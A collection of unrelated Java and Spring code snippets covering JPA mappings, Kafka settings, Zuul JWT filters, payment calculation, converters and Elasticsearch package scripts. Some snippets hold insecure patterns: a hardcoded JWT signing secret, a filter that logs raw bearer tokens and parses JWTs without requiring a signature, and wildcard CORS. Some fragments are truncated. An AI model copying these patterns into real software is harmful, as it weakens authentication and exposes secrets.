@Entity(name="products")
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="product_type", 
  discriminatorType = DiscriminatorType.INTEGER)
public class MyProduct {
    // ...
}

@Entity
@DiscriminatorValue("1")
public class Book extends MyProduct {
    // ...
}

@Entity
@DiscriminatorValue("2")
public class Pen extends MyProduct {
    // ...
}

@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorFormula("case when author is not null then 1 else 2 end")
public class MyProduct { ... }

@Entity
@Inheritance(strategy = InheritanceType.JOINED)
public class Animal {
    @Id
    private long animalId;
    private String species;
 
    // constructor, getters, setters 
}

@Entity
@PrimaryKeyJoinColumn(name = "petId")
public class Pet extends Animal {
    // ...
}

@Entity
@Polymorphism(type = PolymorphismType.EXPLICIT)
public class Bag implements Item { ...}
--------------------------------------------------------------------------------------------------------
import java.util.Comparator;

public enum TypeAndOrdinalColumnComparator implements Comparator<CasserProperty> {

	INSTANCE;

	public int compare(CasserProperty thisVal, CasserProperty anotherVal) {

		int c = Integer.compare(thisVal.getColumnType().ordinal(), anotherVal.getColumnType().ordinal());
		
		if (c == 0) {
			c = Integer.compare(thisVal.getOrdinal(), anotherVal.getOrdinal());
		}

		return c;
	}
	
}
--------------------------------------------------------------------------------------------------------

import java.lang.reflect.Method;
import java.util.function.Function;

public enum GetterMethodDetector implements Function<Method, Boolean> {

	INSTANCE;
	
	@Override
	public Boolean apply(Method method) {
		
		if (method == null) {
			throw new IllegalArgumentException("empty parameter");
		}
		
		if (method.getParameterCount() != 0 || method.getReturnType() == void.class) {
			return false;
		}
		
		return true;
	    
	}

}
--------------------------------------------------------------------------------------------------------
            Properties consumerProperties = new Properties();
            consumerProperties.put("bootstrap.servers", cmd.getOptionValue("broker"));
            consumerProperties.put("group.id", cmd.getOptionValue("group"));

            // Set some default deserializers for the consumed messages.
            // This is required because otherwise Kafka doesn't know what to do with the data.
            consumerProperties.put("key.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");
            consumerProperties.put("value.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");

            // Use autocommit settings so that you don't need to commit the messages you received.
            // This is typically done in scenarios where consistency isn't an issue.
            consumerProperties.put("enable.auto.commit", "true");
            consumerProperties.put("auto.commit.interval.ms", "1000");
--------------------------------------------------------------------------------------------------------
#!/bin/bash

if [ "$TRAVIS_BRANCH" == "master" ] && [ "$TRAVIS_PULL_REQUEST" == "false" ]; then
    echo 'Master branch: trigger QA'
    gradle sonarqube -Dsonar.login=$SONAR_TOKEN
elif [ "$TRAVIS_PULL_REQUEST" != "false" ] && [ -n "${GITHUB_TOKEN:-}" ]; then
    echo 'Pull request: trigger QA and preview analysis'

    gradle sonarqube -Dsonar.login=$SONAR_TOKEN \
        -Dsonar.github.oauth=$GITHUB_TOKEN \
        -Dsonar.github.repository=$TRAVIS_REPO_SLUG \
        -Dsonar.github.pullRequest=$TRAVIS_PULL_REQUEST \
        -Dsonar.login=$SONAR_TOKEN \
        -Dsonar.analysis.mode=preview
fi
--------------------------------------------------------------------------------------------------------
import com.netflix.zuul.ZuulFilter;
import com.netflix.zuul.context.RequestContext;
import io.jsonwebtoken.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;

import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.security.Key;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;

/**
 * Validates JSON Web tokens send by clients
 */
@Component
public class AuthenticationFilter extends ZuulFilter {
    private final Logger logger = LoggerFactory.getLogger(AuthenticationFilter.class);

    /**
     * Gets the type of filter
     */
    @Override
    public String filterType() {
        return "pre";
    }

    /**
     * Gets the filter priority
     */
    @Override
    public int filterOrder() {
        return 0;
    }

    /**
     * Checks whether the filter should be executed
     */
    @Override
    public boolean shouldFilter() {
        return false;
    }

    /**
     * Executes the filter
     */
    @Override
    public Object run() {
        HttpServletRequest request = RequestContext.getCurrentContext().getRequest();
        String authorizationHeader = request.getHeader("Authorization");

        if (authorizationHeader != null && !authorizationHeader.isEmpty() && authorizationHeader.startsWith("Bearer")) {
            String token = authorizationHeader.substring("Bearer".length() + 1);
            logger.info("Received JWT {}", token);

            try {
                Jwts.parser().setSigningKey(loadKey()).parse(token);
                return null;
            } catch (ExpiredJwtException ex) {
                logger.error("Provided token is expired");
            } catch (MalformedJwtException ex) {
                logger.error("Provided token is malformed", ex);
            } catch (SignatureException ex) {
                logger.error("Provided token has an invalid signature", ex);
            }
        }

        sendUnauthorizedResponse();

        return null;
    }

    /**
     * Sends an unauthorized response
     */
    private void sendUnauthorizedResponse() {
        RequestContext context = RequestContext.getCurrentContext();

        context.setSendZuulResponse(false);
        context.setResponseStatusCode(401);
        context.setResponseBody("{ \"message\": \"You are not authorized\" }");

        context.getResponse().setContentType("application/json");
    }

    /**
     * Loads a public key from a resource in the JAR file
     *
     * @return Returns the public key for validating JSON Web Tokens
     */
    private Key loadKey() {
        try {
            InputStream certificateStream = AuthenticationFilter.class
                    .getClassLoader()
                    .getResourceAsStream("auth-server.cer");

            CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
            Certificate certificate = certificateFactory.generateCertificate(certificateStream);

            return certificate.getPublicKey();
        } catch (CertificateException e) {
            logger.error("Failed to create certificate factory", e);
            return null;
        }
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.jwt.crypto.sign.RsaVerifier;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;
import org.springframework.security.oauth2.provider.token.store.jwk.JwkTokenStore;

@Configuration
public class JsonWebTokenConfiguration {

    @Bean
    public TokenStore tokenStore(@Value("${authorizationserver.keyUrl}")String keyUrl) {
        return new JwkTokenStore(keyUrl);
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class HomeController {
    @RequestMapping("/")
    public ModelAndView index() {
        return new ModelAndView("redirect:/swagger-ui.html");
    }
}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import io.vertx.core.json.JsonObject;
import lombok.*;

import java.util.Map;

@AllArgsConstructor(access = AccessLevel.PRIVATE)
@Builder
@JsonIgnoreProperties(ignoreUnknown = true)
@Getter
@ToString
public class Outcome {
    private final String intent;
    private final Map<String, JsonObject> entities;
    private final double confidence;
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class AppConfig {

 @Bean
 public FilterRegistrationBean < CustomURLFilter > filterRegistrationBean() {
  FilterRegistrationBean < CustomURLFilter > registrationBean = new FilterRegistrationBean();
  CustomURLFilter customURLFilter = new CustomURLFilter();

  registrationBean.setFilter(customURLFilter);
  registrationBean.addUrlPatterns("/greeting/*");
  registrationBean.setOrder(2); //set precedence
  return registrationBean;
 }
}


public class CustomURLFilter implements Filter {

 private static final Logger LOGGER = LoggerFactory.getLogger(CustomURLFilter.class);

 @Override
 public void init(FilterConfig filterConfig) throws ServletException {
  LOGGER.info("########## Initiating CustomURLFilter filter ##########");
 }

 @Override
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

  HttpServletRequest request = (HttpServletRequest) servletRequest;
  HttpServletResponse response = (HttpServletResponse) servletResponse;

  LOGGER.info("This Filter is only called when request is mapped for /customer resource");

  //call next filter in the filter chain
  filterChain.doFilter(request, response);
 }

 @Override
 public void destroy() {

 }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@Order(Ordered.HIGHEST_PRECEDENCE)
public class CustomFilter implements Filter {

 private static final Logger LOGGER = LoggerFactory.getLogger(CustomFilter.class);

 @Override
 public void init(FilterConfig filterConfig) throws ServletException {
  LOGGER.info("########## Initiating Custom filter ##########");
 }

 @Override
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

  HttpServletRequest request = (HttpServletRequest) servletRequest;
  HttpServletResponse response = (HttpServletResponse) servletResponse;

  LOGGER.info("Logging Request  {} : {}", request.getMethod(), request.getRequestURI());

  //call next filter in the filter chain
  filterChain.doFilter(request, response);

  LOGGER.info("Logging Response :{}", response.getContentType());
 }

 @Override
 public void destroy() {
  // TODO: 7/4/18
 }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableSwagger2
@Profile(ProfileConsts.GNG_DEV)
public class SwaggerConfiguration {

    private final Logger logger = LoggerFactory.getLogger(SwaggerConfiguration.class);


    @Bean
    public Docket api() {

        logger.debug("Starting Swagger");
        StopWatch watch = new StopWatch();
        watch.start();

        Docket docket = new Docket(DocumentationType.SWAGGER_2)
                .select()
                .apis(RequestHandlerSelectors.any())
                .paths(PathSelectors.any())
                .build()
                .apiInfo(apiInfo());

        watch.stop();
        logger.debug("Started Swagger in {} ms", watch.getTotalTimeMillis());

        return docket;
    }

    private ApiInfo apiInfo() {
        return new ApiInfoBuilder()
                .title("GoNoGO API")
                .description("GoNoGo api for developers")
                .version("2.0")
                .termsOfServiceUrl("http://terms-of-services.url")
                .license("LICENSE")
                .licenseUrl("http://url-to-license.com")
                .build();
    }
}
--------------------------------------------------------------------------------------------------------
 @ApiParam(access="hide")
 @ApiModelProperty(hidden = true)
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import br.com.leonardoz.quantocusta.exceptions.PagamentoInvalidoException;
import br.com.leonardoz.quantocusta.util.Concatenador;

public class CalculadoraPagamento {

	private int vezes;
	private BigDecimal entrada;
	private BigDecimal descontoAVistaUnitario;
	private BigDecimal jurosMensaisUnitario;
	private BigDecimal valor;
	private BigDecimal jurosMensaisPercentuais;
	private BigDecimal descontoAVistaPercentual;

	public List<FormatoPagamento> calcular(
			BigDecimal valor, 
			int vezes, BigDecimal entrada,
			BigDecimal descontoAVistaPercentual, 
			BigDecimal jurosMensaisPercentuais)
					throws PagamentoInvalidoException {
		
		verificarParametrosBasicos(valor, vezes);
		atribuirValores(valor, vezes, entrada, descontoAVistaPercentual, jurosMensaisPercentuais);
		return executar();
	}
	
	private void verificarParametrosBasicos(BigDecimal valor, int vezes) {
		avaliarSeEhValido(valor, "Valor");
		avaliarSeEhValido(vezes, "Número de vezes (parcelas)");
	}
	
	private void verificarParametrosParcelado(BigDecimal entrada, BigDecimal jurosMensaisPercentuais) {
		avaliarSeEhValido(jurosMensaisPercentuais, "Juros mensais percentuais");
		avaliarSeEhValido(entrada, "Entrada");
		avaliaEntrada(entrada, valor);
	}
	
	private void verificarParametrosAVista(BigDecimal descontoAVistaPercentual) {
		avaliarSeEhValido(descontoAVistaPercentual, "Desconto à vista percentual");
		avaliaDesconto(descontoAVistaPercentual, valor);
	}
	
	private void atribuirValores(BigDecimal valor, int vezes, BigDecimal entrada, BigDecimal descontoAVistaPercentual,
			BigDecimal jurosMensaisPercentuais) {
		this.valor = valor;
		this.vezes = vezes;
		this.entrada = entrada;
		this.descontoAVistaPercentual = descontoAVistaPercentual;
		this.jurosMensaisPercentuais = jurosMensaisPercentuais;
		this.jurosMensaisUnitario = adequarTaxas(jurosMensaisPercentuais, BigDecimal.ZERO);
		this.descontoAVistaUnitario = adequarTaxas(descontoAVistaPercentual, BigDecimal.ZERO);
	}

	private List<FormatoPagamento> executar() {
		boolean ehParcelado = vezes > 1;
		if (ehParcelado) {
			return calculaParcelado();
		} else {
			return Arrays.asList(calculaAVista());
		}
	}

	private void avaliaEntrada(BigDecimal entrada, BigDecimal valorTotal) {
		int comparado = entrada.compareTo(valorTotal);
		if (comparado >= 0) {
			String msg = Concatenador.concatenar("Entrada não deve ser igual ou maior que ",
					valorTotal.toString());
			throw new PagamentoInvalidoException(msg);
		}
	}

	private void avaliaDesconto(BigDecimal descontoAVistaPercentual, BigDecimal valorTotal) {
		int comparado = descontoAVistaPercentual.compareTo(BigDecimal.valueOf(100));
		if (comparado == 1) {
			String msg = Concatenador.concatenar("Desconto à vista percentual não deve ser maior que 100% ");
			throw new PagamentoInvalidoException(msg);
		}
	}
	
	private void avaliarSeEhValido(Integer valor, String campo) {
		if (valor == null)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser nulo."));

		if (valor.compareTo(0) == -1)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser um valor negativo."));
	}
	
	private void avaliarSeEhValido(BigDecimal valor, String campo) {
		if (valor == null)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser nulo."));

		if (valor.compareTo(BigDecimal.ZERO) == -1)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser um valor negativo."));
	}

	private BigDecimal adequarTaxas(BigDecimal taxaPercentual, BigDecimal fallback) {
		if (taxaPercentual == null || taxaPercentual.equals(BigDecimal.ZERO)) {
			taxaPercentual = fallback;
			return taxaPercentual;
		} else {
			BigDecimal cento = BigDecimal.valueOf(100);
			return taxaPercentual.divide(cento, 2, RoundingMode.CEILING);
		}
	}

	private List<FormatoPagamento> calculaParcelado() {
		verificarParametrosParcelado(entrada, jurosMensaisPercentuais);
		BigDecimal subTotal = valor.subtract(entrada);

		BigDecimal valorDeParcela = subTotal.divide(BigDecimal.valueOf(vezes), 2, RoundingMode.CEILING);
		// se aumento é de 1,75%, então multiplica valor por 1 + 0,0175
		BigDecimal fator = BigDecimal.ONE.add(jurosMensaisUnitario);
		BigDecimal valorDaParcelaComJuros = valorDeParcela.multiply(fator);
		
		List<FormatoPagamento> parcelas = IntStream
										.range(1, vezes + 1)
										.mapToObj(num -> new Parcela(num, valorDaParcelaComJuros, jurosMensaisPercentuais))
										.collect(Collectors.toList());
		return parcelas;
	}

	private FormatoPagamento calculaAVista() {
		verificarParametrosAVista(descontoAVistaPercentual);
		// se desconto é de 0,1, então 1 - 0,1 = 0,9; 0,9 * valor = valor descontado
		BigDecimal fator = BigDecimal.ONE.subtract(descontoAVistaUnitario);
		BigDecimal total = valor.multiply(fator);
		PagamentoUnico pagamentoUnico = new PagamentoUnico(total);
		return pagamentoUnico;
	}

}
--------------------------------------------------------------------------------------------------------
# Algumas variaveis de ambiente, por enquanto apenas essas (conveniência)
server.context-path=/quantocusta/api
spring.jpa.hibernate.ddl-auto=none
spring.datasource.url=jdbc:mysql://localhost/quantocusta
spring.datasource.username=${quantocusta_db_user}
spring.datasource.password=${quantocusta_db_senha}
spring.datasource.driver-class-name=com.mysql.jdbc.Driver


# JWT
jwt.secret=_@htpa-0329i98d9wahJk283287*!8!!,;.232lOJDhdq
jwt.expiration=604800

# CORS
cors.origin=${quantocusta_cors_origin}

#Email
spring.mail.host=smtp.gmail.com
spring.mail.port=587 
spring.mail.username=${quantocusta_email_endereco}
spring.mail.password=${quantocusta_email_senha}
spring.mail.protocol=smtp
spring.mail.defaultEncoding=UTF-8
spring.mail.properties.mail.smtp.auth=true
spring.mail.properties.mail.smtp.starttls.enable=true
spring.mail.properties.mail.smtp.starttls.required=true
spring.mail.test-connection=true
spring.mail.properties.mail.smtp.ssl.trust=smtp.gmail.com
spring.mail.properties.mail.smtp.socketFactory.fallback=true
--------------------------------------------------------------------------------------------------------
mvn install:install-file -Dfile=primefaces-estoque-theme.jar -DgroupId=com.leonardoz.estoque -DartifactId=primefaces-estoque-theme -Dversion=1.0-SNAPSHOT -Dpackaging=jar
--------------------------------------------------------------------------------------------------------
@Column(columnDefinition = "binary(20)", nullable = false, name = "senha_hash")


import javax.faces.component.UIComponent;
import javax.faces.context.FacesContext;
import javax.faces.convert.Converter;
import javax.faces.convert.FacesConverter;
import javax.inject.Inject;
import javax.inject.Named;

@Named
@FacesConverter(forClass = Produto.class, value = "produtoConverter")
public class ProdutoConverter implements Converter {

    @Inject
    private Produtos produtos;

    @Override
    public Object getAsObject(FacesContext context, UIComponent component, String value) {
	Produto retorno = null;
	System.out.println("O valor é " + value);
	if (value != null && !"".equals(value)) {
	    retorno = produtos.recuperarProduto(Long.valueOf(value)).orElseThrow(IllegalArgumentException::new);
	    System.out.println("Voltou " + retorno.getDescricao());
	}
	return retorno;
    }

    @Override
    public String getAsString(FacesContext context, UIComponent component, Object value) {
	if (value != null) {
	    Produto produto = ((Produto) value);
	    return produto.getId() == null ? null : produto.getId().toString();
	}
	return null;
    }
}

import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

@Converter(autoApply = true)
public class SexoJpaConverter implements AttributeConverter<Sexo, String> {

    @Override
    public String convertToDatabaseColumn(Sexo attribute) {
	return attribute.getSigla();
    }

    @Override
    public Sexo convertToEntityAttribute(String dbData) {
	return Sexo.porSigla(dbData);
    }
}
--------------------------------------------------------------------------------------------------------
@SerializedName("_embedded")
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.text.DecimalFormat;

import net.sf.jasperreports.functions.annotations.Function;
import net.sf.jasperreports.functions.annotations.FunctionCategories;
import net.sf.jasperreports.functions.annotations.FunctionParameter;
import net.sf.jasperreports.functions.annotations.FunctionParameters;

@FunctionCategories({ com.fred.functions.FredCustomFunctions.class })
public class CustomFunctions {

	private static String NUMBER_FORMAT_DECIMAL  = "#,##0.00";
	private static String NUMBER_FORMAT_NO_DECIMAL  = "#,##0";
	
	@Function("FORMAT_WITH_DECIMAL")
	@FunctionParameters({ @FunctionParameter("number"),
			@FunctionParameter("scale"), 
			@FunctionParameter("prefix"),
			@FunctionParameter("suffix") 
	})
	public static String formatTimeDecimal(double number,int scale,String prefix,String suffix){
		return formatNumberValue(NUMBER_FORMAT_DECIMAL,number, scale, prefix, suffix);
	}
	
	
	@Function("FORMAT_WITHOUT_DECIMAL")
	@FunctionParameters({ @FunctionParameter("number"),
			@FunctionParameter("prefix"),
			@FunctionParameter("suffix") 
	})
	public static String formatTimeFixed(double number,String prefix,String suffix){
		return formatNumberValue(NUMBER_FORMAT_NO_DECIMAL,number, 0, prefix, suffix);
	}

	private static String formatNumberValue(String format,double number,int scale, String prefix, String suffix) {
		StringBuilder builder = new StringBuilder();
		
		double doubleValue = new BigDecimal(number).setScale(scale, RoundingMode.HALF_UP).doubleValue();
		
		DecimalFormat df = new DecimalFormat(NUMBER_FORMAT_DECIMAL);
		String formatted = df.format(doubleValue);
		
		builder.append(prefix);
		builder.append(formatted);
		builder.append(suffix);
		return builder.toString();
	}
	
import net.sf.jasperreports.functions.annotations.FunctionCategory;

@FunctionCategory()
public class FredCustomFunctions {
}
--------------------------------------------------------------------------------------------------------
@EnableHypermediaSupport(type = EnableHypermediaSupport.HypermediaType.HAL)
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.netflix.eureka.EnableEurekaClient;
import org.springframework.cloud.netflix.zuul.EnableZuulProxy;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableOAuth2Client;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;

@SpringBootApplication
@EnableEurekaClient
@EnableZuulProxy
@EnableOAuth2Client
@EnableResourceServer
public class GatewayServiceApplication {
    public static void main(String[] args) {
        SpringApplication.run(GatewayServiceApplication.class, args);
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.web.context.ContextLoaderListener;
import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;

public class WebApplicationInitializer implements org.springframework.web.WebApplicationInitializer {
    @Override
    public void onStartup(ServletContext servletContext) throws ServletException {
        AnnotationConfigWebApplicationContext rootContext = new AnnotationConfigWebApplicationContext();
        rootContext.register(SpringConfiguration.class);
        servletContext.addListener(new ContextLoaderListener(rootContext));
    }
}
--------------------------------------------------------------------------------------------------------
import javax.xml.bind.ValidationEvent;
import javax.xml.bind.ValidationEventHandler;

public class ErrorHandler implements ValidationEventHandler {

  @Override
  public boolean handleEvent(ValidationEvent event) {
    boolean stop = false;
    switch (event.getSeverity()) {
      case ValidationEvent.WARNING:
        stop = true;
        break;
      case ValidationEvent.ERROR:
        stop = false;
        System.err.println(event.getMessage());
        System.err.println("line " + event.getLocator().getLineNumber());
        System.err.println("column " + event.getLocator().getColumnNumber());
        break;
      case ValidationEvent.FATAL_ERROR:
        stop = false;
        System.err.println(event.getMessage());
        System.err.println("line " + event.getLocator().getLineNumber());
        System.err.println("column " + event.getLocator().getColumnNumber());
        break;
      default:
        throw new RuntimeException("unknow validation error");
    }
    return stop;
  }
}
--------------------------------------------------------------------------------------------------------
spring:
  application:
    name: auth
  data:
    mongodb:
      host: localhost
      database: cinemausers
      port: 27017
server:
  port: 5000
cors:
  origin: '*'
logging:
  level:
    org:
      springframework:
        security: DEBUG
--------------------------------------------------------------------------------------------------------
mport feign.RequestInterceptor;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.cloud.netflix.eureka.EnableEurekaClient;
import org.springframework.cloud.netflix.feign.EnableFeignClients;
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.oauth2.client.OAuth2RestTemplate;
import org.springframework.security.oauth2.client.token.grant.client.ClientCredentialsResourceDetails;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableOAuth2Client;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationDetails;

@SpringBootApplication
@EnableOAuth2Client
@EnableResourceServer
@EnableGlobalMethodSecurity(securedEnabled = true, prePostEnabled = true)
@EnableFeignClients
@EnableEurekaClient
public class SeanceApplication {
    public static void main(String[] args) {
        SpringApplication.run(SeanceApplication.class);
    }

    @Bean
    @ConfigurationProperties(prefix = "security.oauth2.client")
    public ClientCredentialsResourceDetails clientCredentialsResourceDetails() {
        return new ClientCredentialsResourceDetails();
    }

    @Bean
    public OAuth2RestTemplate clientCredentialsRestTemplate() {
        return new OAuth2RestTemplate(clientCredentialsResourceDetails());
    }

    @Bean
    public RequestInterceptor requestTokenBearerInterceptor() {
        return requestTemplate -> {
            Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
            OAuth2AuthenticationDetails details = (OAuth2AuthenticationDetails) authentication.getDetails();
            requestTemplate.header("Authorization", "Bearer " + details.getTokenValue());
        };
    }
}
--------------------------------------------------------------------------------------------------------
    public void init(String[] args) throws Exception {

        RefineServer server = new RefineServer();
        server.init(host,port);

        boolean headless = Configurations.getBoolean("refine.headless",false);
        if (headless) {
            System.setProperty("java.awt.headless", "true"); 
        } else {
            try {
                RefineClient client = new RefineClient();
                client.init(host,port);
            } catch (Exception e) {
                logger.warn("Sorry, some error prevented us from launching the browser for you.\n\n Point your browser to http://" + host + ":" + port + "/ to start using Refine.");
            }
        }
        
        // hook up the signal handlers
        Runtime.getRuntime().addShutdownHook(
            new Thread(new ShutdownSignalHandler(server))
        );
 
        server.join();
    }
	
	class ShutdownSignalHandler implements Runnable {
    
    private Server _server;

    public ShutdownSignalHandler(Server server) {
        this._server = server;
    }

    @Override
    public void run() {

        // Tell the server we want to try and shutdown gracefully
        // this means that the server will stop accepting new connections
        // right away but it will continue to process the ones that
        // are in execution for the given timeout before attempting to stop
        // NOTE: this is *not* a blocking method, it just sets a parameter
        //       that _server.stop() will rely on
        _server.setGracefulShutdown(3000);

        try {
            _server.stop();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

}

       @Override
            public int compareKeys(Object key1, Object key2) {
                double d1 = ((Number) key1).doubleValue();
                double d2 = ((Number) key2).doubleValue();
                return d1 < d2 ? -1 : (d1 > d2 ? 1 : 0);
            }
--------------------------------------------------------------------------------------------------------
hasBeenEnabledOnStart=false

if [ $1 -eq 1 ] ; then 
    # Initial installation 
    if [ -x /bin/systemctl ] ; then
        /bin/systemctl daemon-reload >/dev/null 2>&1 || :
        /bin/systemctl enable elasticsearch.service
        /bin/systemctl start elasticsearch.service
        hasBeenEnabledOnStart=true
    fi

    if [ -x /sbin/chkconfig -a "$hasBeenEnabledOnStart" == "false" ] ; then
        /sbin/chkconfig --add elasticsearch
        # older suse linux distributions do not ship with systemd
        # but do not have an /etc/init.d/ directory
        # this tries to start elasticsearch on these as well without failing this script
        if [ -x /etc/init.d/elasticsearch ] ; then
            /etc/init.d/elasticsearch start
        elif [ -x /etc/rc.d/init.d/elasticsearch ] ; then
            /etc/rc.d/init.d/elasticsearch start
        fi
    fi

fi

# only execute in case of package removal, not on upgrade
if [ $1 -eq 0 ] ; then

    getent passwd elasticsearch > /dev/null
    if [ "$?" == "0" ] ; then
        userdel elasticsearch
    fi

    getent group elasticsearch >/dev/null
    if [ "$?" == "0" ] ; then
        groupdel elasticsearch
    fi
fi

exit

getent group elasticsearch >/dev/null || groupadd -r elasticsearch
getent passwd elasticsearch >/dev/null || \
    useradd -r -g elasticsearch -d /usr/share/elasticsearch -s /sbin/nologin \
    -c "elasticsearch user" elasticsearch
	
if [ $1 -eq 0 ] ; then
    # Package removal, not upgrade
    if [ -x /bin/systemctl ] ; then
        /bin/systemctl --no-reload disable elasticsearch.service > /dev/null 2>&1 || :
		/bin/systemctl stop elasticsearch.service > /dev/null 2>&1 || :
    fi

    if [ -x /sbin/chkconfig ] ; then
        if [ -x /etc/init.d/elasticsearch ] ; then
            /etc/init.d/elasticsearch stop
        fi
        /sbin/chkconfig --del elasticsearch 2> /dev/null
    fi
fi

exit 0


--------------------------------------------------------------------------------------------------------
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeParseException;
import java.time.format.FormatStyle;
import java.util.Locale;

import javax.enterprise.context.RequestScoped;
import javax.inject.Inject;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import br.com.caelum.vraptor.Convert;
import br.com.caelum.vraptor.converter.ConversionException;
import br.com.caelum.vraptor.converter.ConversionMessage;
import br.com.caelum.vraptor.converter.Converter;

/**
 * A converter for {@link LocalDateTime}.
 *
 * @author Lucas Cavalcanti
 * @author Otávio Scherer Garcia
 */
@Convert(LocalDateTime.class)
@RequestScoped
public class LocalDateTimeConverter implements Converter<LocalDateTime> {
	private static final Logger logger = LoggerFactory.getLogger(LocalDateTimeConverter.class);

	private final Locale locale;

	/**
	 * @deprecated CDI eyes only
	 */
	protected LocalDateTimeConverter() {
		this(null);
	}

	@Inject
	public LocalDateTimeConverter(Locale locale) {
		this.locale = locale;
	}

	@Override
	public LocalDateTime convert(String value, Class<? extends LocalDateTime> type) {
		if (isNullOrEmpty(value)) {
			return null;
		}
		logger.debug("LocalDateTimeValue: " + value);
		System.out.println("LocalDateTimeValue: " + value);
		try {
			return LocalDateTime.parse(value, getFormatter());
		} catch (DateTimeParseException e) {
//			throw new ConversionException(new ConversionMessage("is_not_a_valid_datetime", value));
			return LocalDateTime.parse(value, DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm", locale));
		}
	}

	protected DateTimeFormatter getFormatter() {
		return DateTimeFormatter.ofLocalizedDateTime(FormatStyle.MEDIUM).withLocale(locale);
	}
}
--------------------------------------------------------------------------------------------------------
@Fetch(FetchMode.SUBSELECT)
	@ElementCollection(fetch=FetchType.EAGER,targetClass = Role.class)
	@CollectionTable(name = "account_roles", joinColumns = @JoinColumn(name = "account_id", referencedColumnName = "id") )
	@Column(name = "role", length = 15)
	@Enumerated(EnumType.STRING)
	private Set<Role> roles;
--------------------------------------------------------------------------------------------------------
   @Convert(converter = LocalDateTimeAttributeConverter.class)
    @Column(length = 5, name = "data_hora_envio")
    private LocalDateTime dateHoraDeEnvio;
--------------------------------------------------------------------------------------------------------
import javax.persistence.Column;
import javax.persistence.ElementCollection;
import javax.persistence.Entity;
import javax.persistence.EnumType;
import javax.persistence.Enumerated;
import javax.persistence.NamedQueries;
import javax.persistence.NamedQuery;
import javax.persistence.Table;

import org.apache.commons.lang3.builder.EqualsBuilder;
import org.apache.commons.lang3.builder.HashCodeBuilder;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

@Entity
@Table(name = "usuarios")
@NamedQueries(@NamedQuery(name = "Usuario.buscaPorEmail", query = "select u from Usuario u where u.email = :email"))
@Where(clause = "deletado = 0")
@SQLDelete(sql = "update usuarios set deletado = 1 where id = ?")
public class Usuario extends Entidade {
--------------------------------------------------------------------------------------------------------
	public Optional<Account> isValidToken(String token) {
		ChangeToken change = new ChangeToken();
		change.setJwt(token);
		return isValidToken(change);
	}

	public Optional<Account> isValidToken(ChangeToken token) {

		final Claims claims = Jwts.parser().setSigningKey(PasswordEncryptionService.RANDOM_KEY)
				.parseClaimsJws(token.getJwt()).getBody();

		String uuid = (String) claims.get("uuid");
		Account account = service.getAccount(uuid);

		return Optional.ofNullable(account);
	}

	public ChangeToken createToken(Account account) {
		Instant instant = new Date().toInstant();
		Instant validatedAt = instant.plus(Duration.ofHours(1));
		Date date = Date.from(validatedAt);

		String jwt = Jwts.builder().setSubject(account.getEmail()).claim("uuid", account.getUuid())
				.setIssuedAt(new Date()).setExpiration(date)
				.signWith(SignatureAlgorithm.HS256, PasswordEncryptionService.RANDOM_KEY).compact();
		return new ChangeToken(account.getUuid(), account.getEmail(), jwt);
	}
--------------------------------------------------------------------------------------------------------
nes (20 sloc) 1.79 KB
